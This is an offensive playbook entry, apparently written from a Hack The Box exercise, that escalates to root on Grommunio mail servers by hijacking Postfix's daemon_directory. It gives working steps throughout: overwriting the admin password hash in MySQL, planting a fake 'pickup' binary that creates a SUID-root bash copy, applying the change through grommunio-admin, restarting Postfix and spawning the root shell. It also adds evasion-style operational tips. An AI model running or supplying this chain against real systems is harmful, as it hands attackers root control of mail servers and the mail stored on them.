# Grommunio Postfix Daemon Directory Hijack for Root

## When to use

- Grommunio (or any system using Postfix with admin API control over config)
- Admin access to Grommunio web panel or API (or can overwrite admin hash via MySQL)
- Postfix runs as root for the master process
- Goal: root code execution on the mail server

## Tags

- ATT&CK: T1543.002 (Create or Modify System Process), T1059.004 (Unix Shell)
- Platform: Linux
- Services: Grommunio, Postfix
- Privileges: Grommunio admin (web/API), or MySQL write access to grommunio configs table

## How it works

Postfix's `daemon_directory` setting controls where Postfix looks for its daemon
binaries (pickup, cleanup, smtpd, etc.). By changing this to a writable directory
containing a malicious binary named `pickup`, the next Postfix restart executes
that binary as root.

Grommunio stores Postfix configuration in a database and applies it via a "commit"
action through its admin CLI/API. This allows changing `daemon_directory` remotely.

## Prerequisites

- Grommunio admin API access (or MySQL access to overwrite admin hash)
- A writable directory outside systemd's PrivateTmp scope

## Steps

### 1. Get Grommunio admin access

If you have MySQL creds (often in `/etc/postfix/grommunio-virtual-mailbox-maps.cf`):

```sql
-- Overwrite admin hash via INSERT commit hook or direct UPDATE
UPDATE users SET password='<bcrypt hash>' WHERE username='admin';
```

### 2. Prepare the evil daemon directory

```bash
# CRITICAL: use /var/spool/mail/evil, NOT /tmp
# systemd PrivateTmp gives services their own /tmp, invisible to Postfix
mkdir -p /var/spool/mail/evil

# Symlink all real Postfix binaries
for f in /usr/lib/postfix/bin/*; do
    ln -s "$f" "/var/spool/mail/evil/$(basename $f)"
done

# Replace pickup with malicious version
rm /var/spool/mail/evil/pickup
cat > /var/spool/mail/evil/pickup << 'EOF'
#!/bin/bash
cp /bin/bash /var/spool/mail/rootbash
chmod 4755 /var/spool/mail/rootbash
# Run real pickup so mail still works
exec /usr/lib/postfix/bin/pickup "$@"
EOF
chmod +x /var/spool/mail/evil/pickup
```

### 3. Apply config change via Grommunio

```bash
# Via admin CLI or API
grommunio-admin dbconf set postfix daemon_directory /var/spool/mail/evil
grommunio-admin dbconf commit
```

### 4. Trigger Postfix restart

Stop and start postfix, or wait for the config commit to restart it:
```bash
systemctl restart postfix
```

### 5. Get root

```bash
/var/spool/mail/rootbash -p
```

## Operational notes

**PrivateTmp breaks /tmp.** Systemd services with `PrivateTmp=yes` get their own
`/tmp` namespace. Files written to `/tmp` by your shell are invisible to Postfix.
Use `/var/spool/mail/` or another non-tmp path.

**Symlink all binaries.** Postfix expects all its daemons in daemon_directory. If
any are missing, Postfix fails to start. Symlink everything and only replace the
one you want to hijack.

**pickup runs on incoming mail.** The `pickup` daemon processes messages from the
maildrop queue. It fires when new mail arrives or on periodic checks.

## Proven on

- Grommunio on Linux (HTB Autopilot, 2026-11): daemon_directory hijack via dbconf commit, root via SUID bash
